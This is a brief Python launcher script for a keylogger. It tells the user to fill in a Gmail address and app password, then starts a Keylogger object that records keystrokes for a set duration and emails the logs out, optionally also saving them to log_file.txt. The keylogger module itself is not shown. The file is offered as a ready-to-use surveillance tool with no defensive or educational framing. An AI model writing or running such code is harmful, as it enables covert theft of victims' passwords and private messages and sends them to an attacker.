#!/usr/bin/env python
import keylogger

# Edit these variables according to your preference :
# --------------------------------
email = "yourmail@gmail.com"
pwd = "YourAppPassword"
duration = 10  # in seconds
receive_email = True  # use True or False
dev_mode = True  # display the log in CMD shell and save in log_file.txt
# --------------------------------

mylogger = keylogger.Keylogger(duration, email, pwd, dev_mode, receive_email)
mylogger.start()
